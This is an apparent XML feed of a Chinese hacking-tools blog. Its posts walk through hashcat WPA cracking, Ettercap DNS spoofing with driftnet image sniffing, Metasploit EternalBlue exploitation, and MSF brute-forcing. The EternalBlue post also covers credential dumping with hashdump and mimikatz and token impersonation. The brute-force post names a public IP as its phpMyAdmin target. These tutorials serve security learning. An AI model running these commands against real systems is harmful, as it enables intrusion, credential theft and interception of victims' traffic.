<li><h2 id="四、第二种形式，不知道密码几位数，以及组成形式"><a href="#四、第二种形式，不知道密码几位数，以及组成形式" class="headerlink" title="四、第二种形式，不知道密码几位数，以及组成形式"></a>四、第二种形式，不知道密码几位数，以及组成形式</h2><ul>
<li><h3 id="利用hashcat的掩码形式"><a href="#利用hashcat的掩码形式" class="headerlink" title="利用hashcat的掩码形式"></a>利用hashcat的掩码形式</h3><ul>
<li><h4 id="命令：hashcat-a-3-m-2500-hashcat-hccapx-–increment-–increment-min-1-–increment-max-9-d-d-d-d-d-d-d-d-d"><a href="#命令：hashcat-a-3-m-2500-hashcat-hccapx-–increment-–increment-min-1-–increment-max-9-d-d-d-d-d-d-d-d-d" class="headerlink" title="命令：hashcat -a 3 -m 2500 hashcat.hccapx –increment –increment-min 1 –increment-max 9 ?d?d?d?d?d?d?d?d?d"></a>命令：hashcat -a 3 -m 2500 hashcat.hccapx –increment –increment-min 1 –increment-max 9 ?d?d?d?d?d?d?d?d?d</h4></li>
<li><h4 id="解释：就是8-9位的数字爆破-模块2500就是WAP的模式，不懂的可以看我博客里面hashcat的解释https-gylq-github-io-2021-06-17-E3-80-90-E7-A0-B4-E8-A7-A3-E5-B7-A5-E5-85-B7-E3-80-91Hashcat-E5-8A-A0-E5-AF-86-E7-A0-B4-E8-A7-A3"><a href="#解释：就是8-9位的数字爆破-模块2500就是WAP的模式，不懂的可以看我博客里面hashcat的解释https-gylq-github-io-2021-06-17-E3-80-90-E7-A0-B4-E8-A7-A3-E5-B7-A5-E5-85-B7-E3-80-91Hashcat-E5-8A-A0-E5-AF-86-E7-A0-B4-E8-A7-A3" class="headerlink" title="解释：就是8-9位的数字爆破 模块2500就是WAP的模式，不懂的可以看我博客里面hashcat的解释https://gylq.github.io/2021/06/17/%E3%80%90%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%E3%80%91Hashcat%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/"></a>解释：就是8-9位的数字爆破 模块2500就是WAP的模式，不懂的可以看我博客里面hashcat的解释<a href="https://gylq.github.io/2021/06/17/%E3%80%90%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%E3%80%91Hashcat%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/" target="_blank" rel="noopener">https://gylq.github.io/2021/06/17/%E3%80%90%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%E3%80%91Hashcat%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/</a></h4></li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210622112531846.png" alt="image-20210622112531846"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><h1 id="最后、差不多跑了8分钟出结果，毕竟暴力破解"><a href="#最后、差不多跑了8分钟出结果，毕竟暴力破解" class="headerlink" title="最后、差不多跑了8分钟出结果，毕竟暴力破解"></a>最后、差不多跑了8分钟出结果，毕竟暴力破解</h1><ul>
<li><h3 id="总结：但是位数高了就不太好搞了，所以有一本好字典，是主要的，一亿的字典用hashcat差不多10分钟跑完，mask掩码是无脑，时间等待也是成倍的"><a href="#总结：但是位数高了就不太好搞了，所以有一本好字典，是主要的，一亿的字典用hashcat差不多10分钟跑完，mask掩码是无脑，时间等待也是成倍的" class="headerlink" title="总结：但是位数高了就不太好搞了，所以有一本好字典，是主要的，一亿的字典用hashcat差不多10分钟跑完，mask掩码是无脑，时间等待也是成倍的"></a><strong>总结：但是位数高了就不太好搞了，所以有一本好字典，是主要的，一亿的字典用hashcat差不多10分钟跑完，mask掩码是无脑，时间等待也是成倍的</strong></h3></li>
<li><h3 id="仅仅作于测试。"><a href="#仅仅作于测试。" class="headerlink" title="仅仅作于测试。"></a>仅仅作于测试。</h3></li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>漏洞工具</tag>
        <tag>无线wifi密码破解</tag>
        <tag>aircrack</tag>
      </tags>
  </entry>
  <entry>
    <title>【嗅探工具】Dns劫持 - Ettercap</title>
    <url>/posts/32.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Ettercap简介"><a href="#Ettercap简介" class="headerlink" title="Ettercap简介"></a>Ettercap简介</h1><blockquote>
<p><strong>Ettercap是一个综合性的中间人攻击工具，使用它可以进行ARP欺骗、拦截器、DNS欺骗等常见的中间人攻击。</strong></p>
<ul>
<li><p>官网：<a href="http://www.ettercap-project.org/" target="_blank" rel="noopener">http://www.ettercap-project.org/</a></p>
</li>
<li><p>插件：<a href="https://linux.die.net/man/8/ettercap_plugins" target="_blank" rel="noopener">https://linux.die.net/man/8/ettercap_plugins</a></p>
</li>
<li><p>过滤器：<a href="https://linux.die.net/man/8/etterfilter" target="_blank" rel="noopener">https://linux.die.net/man/8/etterfilter</a></p>
</li>
<li><p><strong>了解DNS是什么：Domain Name System (域名系统 简称：DNS)    //详细资料自己查百度</strong></p>
<p><strong>了解DNS欺骗是什么：攻击者(黑客)冒充域名服务器进行欺骗的一种行为</strong>  </p>
<p><strong>了解DNS原理原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，</strong></p>
<p><strong>这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</strong></p>
</li>
</ul>
</blockquote>
<h1 id="Ettercap常用指令"><a href="#Ettercap常用指令" class="headerlink" title="Ettercap常用指令"></a>Ettercap常用指令</h1><blockquote>
<ul>
<li><h2 id="用户界面类型"><a href="#用户界面类型" class="headerlink" title="用户界面类型"></a>用户界面类型</h2><ul>
<li>-T, -text 使用之显示字符的界面</li>
<li>-q，-quiet 安静模式，不显示抓到的数据包内容</li>
<li>-G ，-gtk  使用GTK+GUI，开启图形化模式</li>
</ul>
</li>
<li><h2 id="日志选项"><a href="#日志选项" class="headerlink" title="日志选项"></a>日志选项</h2><ul>
<li>-w 将嗅探的数据写入pcap文件</li>
<li>-L 此处记录所有流量</li>
</ul>
</li>
<li><p>通用选项</p>
<ul>
<li>-i 使用该网络接口</li>
<li>-l 显示所有的网络接口</li>
<li>-P 开始该插件《plugin》</li>
<li>-F 加载过滤器filter</li>
</ul>
</li>
<li><h2 id="嗅探与攻击选项"><a href="#嗅探与攻击选项" class="headerlink" title="嗅探与攻击选项"></a>嗅探与攻击选项</h2><ul>
<li>-M， mitm《方法：ARGS》执行mitm攻击</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Ettercap实例1-DNS劫持"><a href="#Ettercap实例1-DNS劫持" class="headerlink" title="Ettercap实例1- DNS劫持"></a>Ettercap实例1- DNS劫持</h1><blockquote>
<h2 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h2><p><strong>受害者电脑：192.168.1.110 (多数没装防火墙) )  //受害者机器</strong></p>
<p><strong>笔记本：192.168.1.101 (kali linux系统)   //入侵者机器</strong></p>
<h2 id="网关IP-192-168-1-1"><a href="#网关IP-192-168-1-1" class="headerlink" title="网关IP:192.168.1.1"></a>网关IP:192.168.1.1</h2><ul>
<li><h2 id="一、开启Apache服务"><a href="#一、开启Apache服务" class="headerlink" title="一、开启Apache服务"></a>一、开启Apache服务</h2><ul>
<li><h3 id="编辑html文件：vim-var-www-html-index-html"><a href="#编辑html文件：vim-var-www-html-index-html" class="headerlink" title="编辑html文件：vim /var/www/html/index.html"></a>编辑html文件：vim /var/www/html/index.html</h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619181754757.png" alt="image-20210619181754757"></li>
</ul>
</li>
<li><h3 id="打开服务service-apache2-start"><a href="#打开服务service-apache2-start" class="headerlink" title="打开服务service apache2 start"></a><strong>打开服务service apache2 start</strong></h3><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619182101921.png" alt="image-20210619182101921"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619182251666.png" alt="image-20210619182251666"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619192407694.png" alt="image-20210619192407694"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="二、编辑ettercap配置文件"><a href="#二、编辑ettercap配置文件" class="headerlink" title="二、编辑ettercap配置文件"></a>二、编辑ettercap配置文件</h2><ul>
<li><h3 id="文件路径为vim-etc-ettercap-etter-dns-中添加"><a href="#文件路径为vim-etc-ettercap-etter-dns-中添加" class="headerlink" title="文件路径为vim /etc/ettercap/etter.dns 中添加"></a><strong>文件路径为vim /etc/ettercap/etter.dns 中添加</strong></h3><ul>
<li><pre><code>* A 192.168.1.101
* PTR 192.168.1.101</code></pre><ul>
<li><strong>在对应的位置添加对应的 标识和IP地址  * 代表所有域名 后边就是你要欺骗为的IP地址，这里是当然是我自己的主机IP地址啦</strong></li>
</ul>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619182907359.png" alt="image-20210619182907359"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><h2 id="三、打开Ettercap-GUI界面"><a href="#三、打开Ettercap-GUI界面" class="headerlink" title="三、打开Ettercap GUI界面"></a>三、打开Ettercap GUI界面</h2><ul>
<li><h3 id="ettercap-G"><a href="#ettercap-G" class="headerlink" title="ettercap -G"></a>ettercap -G</h3><ul>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619183327609.png" alt="image-20210619183327609"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619183429972.png" alt="image-20210619183429972"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619183504221.png" alt="image-20210619183504221"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619183556378.png" alt="image-20210619183556378"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619183732674.png" alt="image-20210619183732674"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619183815624.png" alt="image-20210619183815624"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619183853222.png" alt="image-20210619183853222"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619183944074.png" alt="image-20210619183944074"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619184028931.png" alt="image-20210619184028931"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619184058172.png" alt="image-20210619184058172"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619184111011.png" alt="image-20210619184111011"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619184127363.png" alt="image-20210619184127363"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619184247562.png" alt="image-20210619184247562"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619184343479.png" alt="image-20210619184343479"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619184418616.png" alt="image-20210619184418616"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619184446094.png" alt="image-20210619184446094"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619184543106.png" alt="image-20210619184543106"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619185821551.png" alt="image-20210619185821551"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Ettercap实例2-窃取对方浏览图片"><a href="#Ettercap实例2-窃取对方浏览图片" class="headerlink" title="Ettercap实例2 - 窃取对方浏览图片"></a>Ettercap实例2 - 窃取对方浏览图片</h1><blockquote>
<h2 id="准备工作：-1"><a href="#准备工作：-1" class="headerlink" title="准备工作："></a>准备工作：</h2><p><strong>受害者电脑：192.168.1.110 (多数没装防火墙) )  //受害者机器</strong></p>
<p><strong>笔记本：192.168.1.105 (kali linux系统)   //入侵者机器</strong></p>
<ul>
<li><h2 id="一、其他配置和上面例子一样"><a href="#一、其他配置和上面例子一样" class="headerlink" title="一、其他配置和上面例子一样"></a>一、其他配置和上面例子一样</h2></li>
<li><h2 id="二、打开ettercap-GUI界面"><a href="#二、打开ettercap-GUI界面" class="headerlink" title="二、打开ettercap GUI界面"></a>二、打开ettercap GUI界面</h2><ul>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210620210807047.png" alt="image-20210620210807047"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210620210905379.png" alt="image-20210620210905379"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210620211043847.png" alt="image-20210620211043847"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210620211118275.png" alt="image-20210620211118275"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210620211208008.png" alt="image-20210620211208008"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210620211218473.png" alt="image-20210620211218473"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210620211251046.png" alt="image-20210620211251046"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210620211322614.png" alt="image-20210620211322614"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210620211454644.png" alt="image-20210620211454644"></p>
</li>
<li><h2 id="三、已经可以及时监听对方使用了什么网站，放个GIF-看看"><a href="#三、已经可以及时监听对方使用了什么网站，放个GIF-看看" class="headerlink" title="三、已经可以及时监听对方使用了什么网站，放个GIF 看看"></a>三、已经可以及时监听对方使用了什么网站，放个GIF 看看</h2><ul>
<li><img src="https://pic.imgdb.cn/item/60cf433a844ef46bb2dbc3d8.gif" alt="show" />
</li>
</ul>
</li>
<li><h2 id="四、监听对方查看的图片"><a href="#四、监听对方查看的图片" class="headerlink" title="四、监听对方查看的图片"></a>四、监听对方查看的图片</h2></li>
<li><ul>
<li><h3 id="命令：-driftnet-i-eth0-（eth0是你是网卡名）"><a href="#命令：-driftnet-i-eth0-（eth0是你是网卡名）" class="headerlink" title="命令： driftnet -i eth0  （eth0是你是网卡名）"></a>命令： driftnet -i eth0  （eth0是你是网卡名）</h3></li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210620211934067.png" alt="image-20210620211934067"></p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210620212001948.png" alt="image-20210620212001948"></p>
</li>
</ul>
</li>
<li><h2 id="五、继续监听，会出现图片"><a href="#五、继续监听，会出现图片" class="headerlink" title="五、继续监听，会出现图片"></a>五、继续监听，会出现图片</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210620212115675.png" alt="image-20210620212115675"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210620212142031.png" alt="image-20210620212142031"></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="用虚拟机测试，请勿违法。"><a href="#用虚拟机测试，请勿违法。" class="headerlink" title="用虚拟机测试，请勿违法。"></a>用虚拟机测试，请勿违法。</h1>]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>漏洞工具</tag>
        <tag>Dns劫持</tag>
        <tag>Ettercap</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏洞工具】Metasploit框架永恒之蓝</title>
    <url>/posts/58.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MSF-永恒之蓝ms17漏洞利用"><a href="#MSF-永恒之蓝ms17漏洞利用" class="headerlink" title="MSF - 永恒之蓝ms17漏洞利用"></a>MSF - 永恒之蓝ms17漏洞利用</h1><blockquote>
<ul>
<li><p>*<em>环境：windows server 2008 R2 *</em></p>
</li>
<li><h2 id="第一步、搜索ms17-010的漏洞辅助扫描工具"><a href="#第一步、搜索ms17-010的漏洞辅助扫描工具" class="headerlink" title="第一步、搜索ms17-010的漏洞辅助扫描工具"></a>第一步、搜索ms17-010的漏洞辅助扫描工具</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618082235168.png" alt="image-20210618082235168"></li>
</ul>
</li>
<li><h2 id="第二步、use该辅助模块"><a href="#第二步、use该辅助模块" class="headerlink" title="第二步、use该辅助模块"></a>第二步、use该辅助模块</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618082325376.png" alt="image-20210618082325376"></li>
</ul>
</li>
<li><h2 id="第三步、设置攻击参数，Rhost这是攻击主机的ip地址，永恒之蓝就是攻击445端口"><a href="#第三步、设置攻击参数，Rhost这是攻击主机的ip地址，永恒之蓝就是攻击445端口" class="headerlink" title="第三步、设置攻击参数，Rhost这是攻击主机的ip地址，永恒之蓝就是攻击445端口"></a>第三步、设置攻击参数，Rhost这是攻击主机的ip地址，永恒之蓝就是攻击445端口</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618082527325.png" alt="image-20210618082527325"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618082600801.png" alt="image-20210618082600801"></li>
</ul>
</li>
<li><h2 id="第四步、搜索exploit关于ms17-010，然后找到永恒之蓝"><a href="#第四步、搜索exploit关于ms17-010，然后找到永恒之蓝" class="headerlink" title="第四步、搜索exploit关于ms17-010，然后找到永恒之蓝"></a>第四步、搜索exploit关于ms17-010，然后找到永恒之蓝</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618082739059.png" alt="image-20210618082739059"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618082904198.png" alt="image-20210618082904198"></li>
</ul>
</li>
<li><h2 id="第五步、找payload，windows反连payload-也就是windows-meterpreter-reverse-tcp"><a href="#第五步、找payload，windows反连payload-也就是windows-meterpreter-reverse-tcp" class="headerlink" title="第五步、找payload，windows反连payload 也就是windows/meterpreter/reverse_tcp"></a>第五步、找payload，windows反连payload 也就是windows/meterpreter/reverse_tcp</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618083429422.png" alt="image-20210618083429422"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618083601528.png" alt="image-20210618083601528"></li>
<li><h2 id="第一次尝试，虚拟机挂了"><a href="#第一次尝试，虚拟机挂了" class="headerlink" title="第一次尝试，虚拟机挂了"></a><strong>第一次尝试，虚拟机挂了</strong></h2></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618130220362.png" alt="image-20210618130220362"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618085119005.png" alt="image-20210618085119005"></li>
<li><h2 id="第二次尝试成功"><a href="#第二次尝试成功" class="headerlink" title="第二次尝试成功"></a><strong>第二次尝试成功</strong></h2></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618115140048.png" alt="image-20210618115140048"></li>
</ul>
</li>
<li><h2 id="建议会话之后的命令使用"><a href="#建议会话之后的命令使用" class="headerlink" title="建议会话之后的命令使用"></a>建议会话之后的命令使用</h2><ul>
<li><p><strong>getlwd – 显示本地工作目录</strong></p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618200541943.png" alt="image-20210618200541943"></li>
</ul>
</li>
<li><p><strong>ipconfig –显示网络接口信息</strong></p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618200657205.png" alt="image-20210618200657205"></li>
</ul>
</li>
<li><p>ps  –列出正在运行的程序</p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618200717296.png" alt="image-20210618200717296"></li>
</ul>
</li>
<li><p><strong>migrate</strong> <strong>– 根据ps查看的pid可以任意迁移平行权限和下行权限</strong></p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618200829834.png" alt="image-20210618200829834"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618200937038.png" alt="image-20210618200937038"></li>
<li><strong>sysinfo –获取远程系统有关信息</strong><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618201053573.png" alt="image-20210618201053573"></li>
</ul>
</li>
<li>提权和密码命令<ul>
<li>getsystem（尝试简单提权）<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618201334096.png" alt="image-20210618201334096"></li>
</ul>
</li>
<li>hashdump（获取hash密码）<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618201408765.png" alt="image-20210618201408765"></li>
</ul>
</li>
</ul>
</li>
<li>screenshot （获取远程桌面图片）<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618201723492.png" alt="image-20210618201723492"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618201749166.png" alt="image-20210618201749166"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="shell（感觉比较实用的一个了）"><a href="#shell（感觉比较实用的一个了）" class="headerlink" title="shell（感觉比较实用的一个了）"></a>shell（感觉比较实用的一个了）</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618201834813.png" alt="image-20210618201834813"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618201936506.png" alt="image-20210618201936506"></li>
</ul>
</li>
</ul>
</li>
<li><h2 id="mimikatz（被换了个名字kiwi）抓取管理员账号和密码方式"><a href="#mimikatz（被换了个名字kiwi）抓取管理员账号和密码方式" class="headerlink" title="mimikatz（被换了个名字kiwi）抓取管理员账号和密码方式"></a><strong>mimikatz（被换了个名字kiwi）抓取管理员账号和密码方式</strong></h2><ul>
<li><p>load -l （查看可用模块）</p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618202215220.png" alt="image-20210618202215220"></li>
</ul>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210618202236991.png" alt="image-20210618202236991"></p>
</li>
<li><h2 id="使用命令（kiwi-cmd-sekurlsa-logonpasswords）"><a href="#使用命令（kiwi-cmd-sekurlsa-logonpasswords）" class="headerlink" title="使用命令（kiwi_cmd sekurlsa::logonpasswords）"></a>使用命令（kiwi_cmd sekurlsa::logonpasswords）</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618202635214.png" alt="image-20210618202635214"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618202739496.png" alt="image-20210618202739496"></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><h2 id="远程CMD命令执行"><a href="#远程CMD命令执行" class="headerlink" title="远程CMD命令执行"></a>远程CMD命令执行</h2><ul>
<li>execute -f cmd -c</li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619165901762.png" alt="image-20210619165901762"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619165918970.png" alt="image-20210619165918970"></li>
</ul>
</li>
<li><h2 id="木马模式调到后台执行"><a href="#木马模式调到后台执行" class="headerlink" title="木马模式调到后台执行"></a>木马模式调到后台执行</h2><ul>
<li><h2 id="background"><a href="#background" class="headerlink" title="background"></a>background</h2></li>
</ul>
</li>
<li><h2 id="木马调回前台"><a href="#木马调回前台" class="headerlink" title="木马调回前台"></a>木马调回前台</h2><ul>
<li><h2 id="session-l"><a href="#session-l" class="headerlink" title="session -l"></a>session -l</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619170225259.png" alt="image-20210619170225259"></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><h2 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h2></li>
<li><p>use incognito #heip incognito 查看帮助</p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619170849281.png" alt="image-20210619170849281"></p>
</li>
<li><p>list_tokens -u 查看可用的token</p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210619170901610.png" alt="image-20210619170901610"></p>
</li>
<li><p>impersonate_token “伪造的身份” #假冒token 或者</p>
</li>
<li><p>举个例子：impersonate_token NT AUTHORITY\SYSTEM #不加单引号 需使用\</p>
</li>
<li><h2 id="execute-f-cmd-exe-i-–t-t-使用假冒的token-执行-或者直接shell"><a href="#execute-f-cmd-exe-i-–t-t-使用假冒的token-执行-或者直接shell" class="headerlink" title="execute -f cmd.exe -i –t # -t 使用假冒的token 执行 或者直接shell"></a>execute -f cmd.exe -i –t # -t 使用假冒的token 执行 或者直接shell</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619171137897.png" alt="image-20210619171137897"></li>
</ul>
</li>
<li><p>登陆靶机电脑 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">rdesktop -u 用户名 -p 密码 登陆ip地址</span><br></pre></td></tr></table></figure></div>



</li>
</ul>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619171255577.png" alt="image-20210619171255577"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210619171334541.png" alt="image-20210619171334541"></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>漏洞工具</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>【漏洞工具】Metasploit框架爆破模块</title>
    <url>/posts/30.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MSF-爆破模块"><a href="#MSF-爆破模块" class="headerlink" title="MSF - 爆破模块"></a>MSF - 爆破模块</h1><blockquote>
<ul>
<li><p>环境<a href="http://www.phpstudy.net" target="_blank" rel="noopener">http://www.phpstudy.net</a></p>
</li>
<li><p>查找爆破模块的姿势</p>
<ul>
<li><p>1、查找服务名</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">search type:auxiliary ssh</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210618092405310.png" alt="image-20210618092405310"></p>
</li>
<li><p>2、查找服务器+关键词</p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618092513787.png" alt="image-20210618092513787"></li>
</ul>
</li>
<li><p>3、 SSH密码爆破</p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618092627518.png" alt="image-20210618092627518"></li>
</ul>
</li>
<li><p>4、Mysql密码爆破</p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618092709647.png" alt="image-20210618092709647"></li>
</ul>
</li>
<li><p>5、phpmyadmin登陆验证爆破 </p>
<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618092753784.png" alt="image-20210618092753784"></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>案例：phpMyAdmin爆破实操</strong></p>
<ul>
<li>环境<a href="http://59.63.200.79:8805/phpmyadmin/" target="_blank" rel="noopener">http://59.63.200.79:8805/phpmyadmin/</a></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618093326802.png" alt="image-20210618093326802"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618093422886.png" alt="image-20210618093422886"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618093939807.png" alt="image-20210618093939807"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618195116416.png" alt="image-20210618195116416"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618094109007.png" alt="image-20210618094109007"></li>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618094151355.png" alt="image-20210618094151355"></li>
<li></li>
</ul>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>漏洞工具</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>【嗅探工具】wireshark初步认识</title>
    <url>/posts/31.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Wireshark初步使用"><a href="#Wireshark初步使用" class="headerlink" title="Wireshark初步使用"></a>Wireshark初步使用</h1><blockquote>
<ul>
<li><strong>安装</strong><ul>
<li>下载地址:<a href="https://www.wireshark.org/#download" target="_blank" rel="noopener">https://www.wireshark.org/#download</a></li>
</ul>
</li>
<li><strong>过滤器的使用方法</strong><ul>
<li>http.request.method ==”POST”or icmp.type<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618205842870.png" alt="image-20210618205842870"></li>
</ul>
</li>
<li>ip.addr == 192.168.1.101<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618210419617.png" alt="image-20210618210419617"></li>
</ul>
</li>
<li>ip.src == 192.168.1.101/16(来源是这个网段的显示)<ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210618210636824.png" alt="image-20210618210636824"></li>
</ul>
</li>
<li>http.hos == “192.168.88.132” 显示主机相关的数据包</li>
